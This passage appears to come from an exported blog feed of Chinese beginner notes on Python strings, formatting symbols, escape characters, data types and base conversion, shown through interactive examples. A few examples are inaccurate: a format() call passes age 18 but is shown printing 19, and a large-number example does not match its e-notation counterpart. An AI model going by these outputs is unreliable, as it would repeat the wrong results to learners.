class="string">&#x27;f&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.endswith(<span class="string">&#x27;syf&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>10.<code>startswith()</code> 方法用于检查字符串是否是以指定子字符串开头，如果是则返回 True，否则返回 False。如果参数 beg 和 end 指定值，则在指定范围内检查。<br>语法:<br><code>str.startwith(str,begin,rend)</code><br>str—–检测的字符串。<br>begin—-可选参数用于设置字符串检测的起始位置。<br>end—-可选参数用于设置字符串检测的结束位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.startswith(<span class="string">&#x27;$&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.startswith(<span class="string">&#x27;$wkx&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>11.<code>find()</code> 方法检测字符串中是否包含子字符串 str ，如果指定 begin（开始） 和 end（结束） 范围，则检查是否包含在指定范围内，如果包含子字符串返回开始的索引值，否则返回-1。（没找到就返回-1）<br>语法:<br>str.find(str,begin,end)<br>str—–指定检索的字符串<br>begin—-开始索引，默认为0<br>end—–结束索引，默认为字符串的长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj = <span class="string">&#x27;/wkx/ncl/syf.py&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.find(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.find(<span class="string">&#x27;/&#x27;</span>,<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line"><span class="number">-1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.find(<span class="string">&#x27;.py&#x27;</span>)</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.find(<span class="string">&#x27;.html&#x27;</span>)</span><br><span class="line"><span class="number">-1</span></span><br></pre></td></tr></table></figure><p>12.<code>format()</code>和%格式化功能一样，基本语法是通过 {} 和：来代替以前的%。format函数可以接受不限个参数，位置可以不按顺序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj=<span class="string">&#x27;name:&#123;&#125;,age:&#123;&#125;,sex:&#123;&#125;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(lxj.format(<span class="string">&#x27;wkx&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;male&#x27;</span>))</span><br><span class="line">name:wkx,age:<span class="number">19</span>,sex:male</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj=<span class="string">&#x27;name:&#123;a&#125;,age:&#123;b&#125;,sex:&#123;c&#125;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> (lxj.format(a=<span class="string">&#x27;syf&#x27;</span>,b=<span class="number">19</span>,c=<span class="string">&#x27;male&#x27;</span>))</span><br><span class="line">name:syf,age:<span class="number">19</span>,sex:male</span><br></pre></td></tr></table></figure><p>13.digit英文解释：数字<br><code>isdigit()</code>判断字符串内是否全是数字。如果字符串只包含数字则返回 True 否则返回 False。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj = <span class="string">&#x27;zxcv0221&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.isdigit()</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj = <span class="string">&#x27;123456789&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.isdigit()</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>14.<code>isalpha()</code> 方法检测字符串是否只由字母组成。如果字符串至少有一个字符并且所有字符都是字母则返回 True,否则返回 False</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj = <span class="string">&#x27;zxcv0221&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.isalpha()</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj = <span class="string">&#x27;zxcv&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.isalpha()</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>15.<code>index()</code> 方法检测字符串中是否包含子字符串 str ，如果指定 beg（开始） 和 end（结束） 范围，则检查是否包含在指定范围内，该方法与 python <code>find()</code>方法一样，只不过如果str不在 string中会报一个异常。<br><img src="https://img-blog.csdnimg.cn/20200301180811461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>16.<code>replace()</code> 方法把字符串中的 old（旧字符串） 替换成 new(新字符串)，如果指定第三个参数max，则替换不超过 max 次。<br>语法：<br><code>str.replace(old,new,max)</code><br>old—-将被替换的子字符串<br>new—-新字符串，用于替换old子字符串<br>cishu—-指定替换次数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj = <span class="string">&#x27;this is test&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.replace(<span class="string">&#x27;is&#x27;</span>,<span class="string">&#x27;are&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;thare are test&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.replace(<span class="string">&#x27;is&#x27;</span>,<span class="string">&#x27;are&#x27;</span>,<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;thare is test&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.replace(<span class="string">&#x27;is&#x27;</span>,<span class="string">&#x27;are&#x27;</span>,<span class="number">2</span>)</span><br><span class="line"><span class="string">&#x27;thare are test&#x27;</span></span><br></pre></td></tr></table></figure><p>17.<code>split()</code>通过指定分隔符对字符串进行切片，如果参数num 有指定值，则仅分隔 num 个子字符串<br>语法：<br><code>str.split(&#39;分隔符&#39;,num)</code><br>分隔符默认为所有的空字符，包括空格、换行(\n)、制表符(\t)等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj = <span class="string">&#x27;lxj:wkx:syf:ncl:lalala&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.split()</span><br><span class="line">[<span class="string">&#x27;lxj:wkx:syf:ncl:lalala&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;lxj&#x27;</span>, <span class="string">&#x27;wkx&#x27;</span>, <span class="string">&#x27;syf&#x27;</span>, <span class="string">&#x27;ncl&#x27;</span>, <span class="string">&#x27;lalala&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.split(<span class="string">&#x27;:&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">[<span class="string">&#x27;lxj&#x27;</span>, <span class="string">&#x27;wkx&#x27;</span>, <span class="string">&#x27;syf:ncl:lalala&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.split(<span class="string">&#x27;:&#x27;</span>,<span class="number">3</span>)</span><br><span class="line">[<span class="string">&#x27;lxj&#x27;</span>, <span class="string">&#x27;wkx&#x27;</span>, <span class="string">&#x27;syf&#x27;</span>, <span class="string">&#x27;ncl:lalala&#x27;</span>]</span><br></pre></td></tr></table></figure><p>18.<code>isspace()</code> 方法检测字符串是否只由空格组成。<br>如果字符串中只包含空格，则返回 True，否则返回 False.和将一段空字符串使用strip处理后判断是否等于’’一样。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj = <span class="string">&#x27;        &#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.isspace()</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.strip() == <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>19.<code>swapcase()</code> 方法用于对字符串的大小写字母进行转换。<br>返回大小写字母转换后生成的新字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj = <span class="string">&#x27;I\&#x27;m waiting my love!&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.swapcase()</span><br><span class="line"><span class="string">&quot;i&#x27;M WAITING MY LOVE!&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj = <span class="string">&#x27;asdkdKDSJCN&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.swapcase()</span><br><span class="line"><span class="string">&#x27;ASDKDkdsjcn&#x27;</span></span><br></pre></td></tr></table></figure><p>20.<code>ljust()</code> 方法返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。<br>语法：<br><code>str.ljust(width,fillchar)</code><br>width—–指定字符串长度<br>fillchar—-填充字符，默认为空格<br><code>rjust() </code>方法返回一个原字符串右对齐,并使用空格填充至长度 width 的新字符串。如果指定的长度小于字符串的长度则返回原字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj = <span class="string">&#x27;wkx&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.ljust(<span class="number">10</span>,<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;wkx&amp;&amp;&amp;&amp;&amp;&amp;&amp;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lxj.rjust(<span class="number">10</span>,<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&amp;&amp;&amp;&amp;&amp;&amp;&amp;wkx&#x27;</span></span><br></pre></td></tr></table></figure><p>OK，先简单介绍这么多，我天，我还记不下来呢，好多啊，这还都是比较常用的，害，记东西什么的最烦了。🙄🙄🙄🙄<br>字符串格式化符号及含义<br>| 符号 | 说明 |<br>|–|–|<br>|%c  | 格式化字符及其ASCII码 |<br>|%s|格式化字符串|<br>|%d|格式化整数|<br>|%o|格式化无符号八进制数|<br>|%x|格式化无符号十六进制数|<br>|%X|格式化无符号十六进制数（大写）|<br>|%f|格式化定点数，可指定小数点后的精度|<br>|%e|用科学计数法格式化定点数|<br>|%E|同%e 用科学计数法格式化定点数|<br>|%g|根据值的大小决定使用%f或%e|<br>|%G|跟%g一样，根据值的大小决定使用%f或%E|</p><p>呼，真多，，，😭😭😭😭<br>按顺序来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">################################1.##########################</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;%c&#x27;</span>% <span class="number">97</span></span><br><span class="line"><span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;%c %c %c&#x27;</span> % (<span class="number">97</span>,<span class="number">98</span>,<span class="number">99</span>)</span><br><span class="line"><span class="string">&#x27;a b c&#x27;</span></span><br><span class="line"><span class="comment">#################################2##########################</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;%s&#x27;</span> % <span class="string">&#x27;nothing is impossible&#x27;</span></span><br><span class="line"><span class="string">&#x27;nothing is impossible&#x27;</span></span><br><span class="line"><span class="comment">#################################3.#########################</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;%d+%d=%d&#x27;</span>% (<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>+<span class="number">5</span>)</span><br><span class="line"><span class="string">&#x27;4+5=9&#x27;</span></span><br><span class="line"><span class="comment">#################################4##########################</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;%o&#x27;</span>% <span class="number">10</span></span><br><span class="line"><span class="string">&#x27;12&#x27;</span></span><br><span class="line"><span class="comment">#################################5##########################</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;%x&#x27;</span> % <span class="number">10</span></span><br><span class="line"><span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="comment">###############################6###########################</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;%X&#x27;</span> % <span class="number">10</span></span><br><span class="line"><span class="string">&#x27;A&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;%X&#x27;</span> % <span class="number">160</span></span><br><span class="line"><span class="string">&#x27;A0&#x27;</span></span><br><span class="line"><span class="comment">#############################7##############################</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;%f&#x27;</span> % <span class="number">37.698</span></span><br><span class="line"><span class="string">&#x27;37.698000&#x27;</span></span><br><span class="line"><span class="comment">##############################8#############################</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;%e&#x27;</span> % <span class="number">37.698</span></span><br><span class="line"><span class="string">&#x27;3.769800e+01&#x27;</span></span><br><span class="line"><span class="comment">###############################9############################</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;%E&#x27;</span> % <span class="number">37.698</span></span><br><span class="line"><span class="string">&#x27;3.769800E+01&#x27;</span></span><br><span class="line"><span class="comment">#############################10#############################</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;%g&#x27;</span> % <span class="number">37.698</span></span><br><span class="line"><span class="string">&#x27;37.698&#x27;</span></span><br></pre></td></tr></table></figure><p>最后再总结下转义字符<br>|符号| 说明 |<br>|–|–|<br>| &#39; |  单引号|<br>|&quot;| 双引号|<br>|\a|发出系统响铃声|<br>|\b|退格符|<br>|\n|换行符|<br>|\t|横向制表符（tab）|<br>|\v|纵向制表符|<br>|\r|回车符|<br>|\f|换页符|<br>|\o|八进制数代表的字符|<br>|\x|十六进制数代表的字符|<br>|\0|表示一个空字符|<br>|\\|反斜杠|</p><p>呼。。。累，，终于结束了。最近脑阔疼，我在想是不是熬夜太多了，不行不行，今天早点睡。不然真成秃头小宝贝了。想想都可怕。溜了溜了<br><img src="https://img-blog.csdnimg.cn/20200301203822702.jpg" alt="在这里插入图片描述" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python入坑学习笔记(2)</title>
      <link href="/2020/08/23/python%E5%85%A5%E5%9D%91%E4%B9%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)/"/>
      <url>/2020/08/23/python%E5%85%A5%E5%9D%91%E4%B9%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h3 id="变量和数据类型"><a href="#变量和数据类型" class="headerlink" title="变量和数据类型"></a>变量和数据类型</h3><p>变量和数据类型在编程语言里倒是没有多少不同，python这门编程语言也是，上学期刚学过C语言，所以学起其他语言会省力一点。<br>变量来源于数学，是计算机语言中能储存计算结果或能表示值抽象概念。变量可以通过变量名访问。在指令式语言中，变量通常是可变的。<br><strong>数据类型</strong>（几种比较常用的）<br>1.整型（用<code>int</code>来表示)：python里的整型可以表示二进制、八进制、十进制、十六进制。<br>2.浮点型：跟C里的一样，表示小数。<br>3.字符串型：在python这里字符串用单引号或者双引号串起来都可以，不像C，只能用双引号。<br>*4.布尔型：布尔值只有True、False两种值，python里，可以直接使用这两个布尔值，（不过大小写要注意）<br>*5.复数型：跟数学上的复数表示一样，两者不一样的地方是虚部的i换成了j<br>    上面几种，有两个我用“<code>*</code>”标注起来了，这两种是我之前学C的时候没有遇到的，所以我就做了个标记。<br> 下面做个实例，用用这几个数据类型。<br> 在Python中可以使用type函数对变量的类型进行检查。使用type()检查变量的类型<br> <img src="https://img-blog.csdnimg.cn/20200213005442790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br> <code>str</code>是字符串类型<br> <code>complex</code>是复数类型<br><code>bool</code>布尔类型<br>还可以使用Python中内置的函数对变量类型进行转换。</p><ul><li>int()：将一个数值或字符串转换成整数，可以指定进制。</li><li>float()：将一个字符串转换成浮点数。</li><li>str()：将指定的对象转换成字符串形式，可以指定编码。</li><li>chr()：将整数转换成该编码对应的字符串（一个字符）。</li><li>ord()：将字符串（一个字符）转换成对应的编码（整数）。<h4 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h4>进制转换也是困扰我好长时间的问题，因为没有经常使用，所以记了忘，忘了再记，害<del>~</del>今天我把它记下来，再记一遍！！</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">dec = <span class="keyword">int</span>(input(<span class="string">&#x27;10进制数为：&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换为二进制为：&quot;</span>, bin(dec))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换为八进制为：&quot;</span>, oct(dec))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换为十六进制为：&quot;</span>, hex(dec))</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;101010&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;二进制字符串转换成十进制数为：&quot;</span>,<span class="keyword">int</span>(a, <span class="number">2</span>))</span><br><span class="line">b = <span class="string">&#x27;36&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;八进制字符串转换成十进制数为：&quot;</span>,<span class="keyword">int</span>(b, <span class="number">8</span>))</span><br><span class="line">c = <span class="string">&#x27;FFF&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;十六进制字符串转换成十进制数为：&quot;</span>,<span class="keyword">int</span>(c, <span class="number">16</span>))</span><br><span class="line">#运行结果:</span><br><span class="line"><span class="number">10</span>进制数为：<span class="number">10</span></span><br><span class="line">转换为二进制为： <span class="number">0</span>b1010</span><br><span class="line">转换为八进制为： <span class="number">0</span>o12</span><br><span class="line">转换为十六进制为： <span class="number">0xa</span></span><br><span class="line">二进制字符串转换成十进制数为： <span class="number">42</span></span><br><span class="line">八进制字符串转换成十进制数为： <span class="number">30</span></span><br><span class="line">十六进制字符串转换成十进制数为： <span class="number">4095</span></span><br></pre></td></tr></table></figure><h3 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h3><table><thead><tr><th>运算符</th><th>涵义</th></tr></thead><tbody><tr><td><code>+</code>、<code>-</code>、<code>*</code>、<code>/</code></td><td><code>加</code>、<code>减</code>、<code>乘</code>、<code>除</code></td></tr><tr><td><code>==</code>、<code>&gt;=</code>、<code>&lt;=</code>、<code>!=</code></td><td><code>等于</code>、<code>大于等于</code>、<code>小于等于</code>、<code>不等于</code></td></tr><tr><td><code>**</code>、<code>//</code>、<code>&lt;&lt;</code>、<code>&gt;&gt;</code></td><td><code>指数</code>、<code>整除</code>、<code>左移</code>、<code>右移</code></td></tr><tr><td><code>and</code>、<code>or</code></td><td><code>和</code>、<code>或</code></td></tr><tr><td>这些都是最常用的运算符，在实际开发中，如果搞不清楚运算符的优先级，可以使用括号来确保运算的执行顺序。</td><td></td></tr><tr><td>简单的加减乘除就不用说了，跟C的样子没什么区别。</td><td></td></tr><tr><td>这次我决定换个方式学习python，就是学习小甲鱼的方法——边写实例边学习新知识，就是实战中学习。<a href="https://www.bilibili.com/video/av4050443?p=1">小甲鱼python！</a> 下面看看效果。</td><td></td></tr><tr><td><strong>字符串合并</strong></td><td></td></tr></tbody></table><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; yourfriend = <span class="string">&#x27;康康&#x27;</span></span><br><span class="line">&gt;&gt;&gt; myfriend = <span class="string">&#x27;开心&#x27;</span></span><br><span class="line">&gt;&gt;&gt; ourfriend = yourfriend + myfriend</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(ourfriend)</span><br><span class="line">康康开心</span><br></pre></td></tr></table></figure><p>简单的字符串合并在python中就可以这样实现，感觉比C简单多了。继续……<br><strong>转义字符</strong><br>转义字符是<code>\</code>。比如：你想打印<code>let&#39;s go</code>这个<code>&#39;</code>怎么办呢???直接打印恐怕是不行！！，先试试：<img src="https://img-blog.csdnimg.cn/20200218210550546.png" alt="在这里插入图片描述" loading="lazy"><br>看,报错了。果然不行，这个时候用到了转义字符<br><img src="https://img-blog.csdnimg.cn/20200218210821785.png" alt="在这里插入图片描述" loading="lazy"><br>看下对比！！！很明显转义字符起作用了。<br><strong>长字符串</strong><br>如果遇到长的字符串怎么打印呢，？比如：歌词吧！：<br>这一天 我终于与你相见<br>你露出了已久不见的笑脸<br>你的小酒窝 让我浮想联翩<br>我真的好久都没这种感觉<br>你像 花儿一样很美<br>美的让人沉醉<br>让我忘了我是谁<br>你的美像一个刺猬<br>句句刺我心扉<br>让我带着你微笑回味<br>这个就应该用到<code>三重引号</code>什么是<code>三重引号</code>，看例子<br><img src="https://img-blog.csdnimg.cn/20200218212110861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>嘿嘿！！这样多好。。<br><strong>e记法</strong><br>在数据中有时候会出现非常大的数，像：<code>150000000000</code>、<code>0.0000000000025</code>之类的数，我们记起来非常麻烦，所以就有了e记法。看样例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="number">150000000000000000000</span></span><br><span class="line"><span class="number">150000000000000000000</span></span><br><span class="line">&gt;&gt;&gt; <span class="number">1.5e11</span></span><br><span class="line"><span class="number">150000000000.0</span></span><br><span class="line">&gt;&gt;&gt; <span class="number">0.0000000000025</span></span><br><span class="line"><span class="number">2.5e-12</span></span><br></pre></td></tr></table></figure><p>e记法比较省事，规律搞明白用处非常多！！<br><strong>布尔类型的小规律</strong><br>都知道布尔类型只有True和False，其实布尔类型可以说是特殊的整型，True代表1、False代表0。具体看下示例:<br><img src="https://img-blog.csdnimg.cn/20200218214422946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>很明显，是可以的，而图中报错的地方相信都明白——零不能做除数。不过，这个就当是了解一下，在计算中这么做不合适。！！！<br><strong>数据类型间的转换</strong><br>1.将字符串类型转换为整型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = <span class="string">&#x27;520&#x27;</span></span><br><span class="line">&gt;&gt;&gt; b = <span class="keyword">int</span>(a)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(b)</span><br><span class="line"><span class="number">520</span></span><br></pre></td></tr></table></figure><p>2.浮点型转换为整型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = <span class="number">5.99</span></span><br><span class="line">&gt;&gt;&gt; c = <span class="keyword">int</span>(a)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(c)</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><p>这里需要注意的是，python在这儿做的是<strong>截断处理</strong>，就是将小数点后面的数全部截掉！！而不是数学中的四舍五入。<br>3.字符串转换成浮点型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = <span class="string">&#x27;520&#x27;</span></span><br><span class="line">&gt;&gt;&gt; d = float(a)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(d)</span><br><span class="line"><span class="number">520.0</span></span><br></pre></td></tr></table></figure><p>这个不用多做解释，都理解。<br>整数也一样</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = <span class="number">520</span></span><br><span class="line">&gt;&gt;&gt; e = float(a)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(e)</span><br><span class="line"><span class="number">520.0</span></span><br></pre></td></tr></table></figure><p>很简单的。。。<br>4.其他类型转换成字符串类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = <span class="number">520</span></span><br><span class="line">&gt;&gt;&gt; b = str(a)</span><br><span class="line">&gt;&gt;&gt; b</span><br><span class="line"><span class="string">&#x27;520&#x27;</span></span><br><span class="line">&gt;&gt;&gt; a = <span class="number">5.99</span></span><br><span class="line">&gt;&gt;&gt; c =str(a)</span><br><span class="line">&gt;&gt;&gt; c</span><br><span class="line"><span 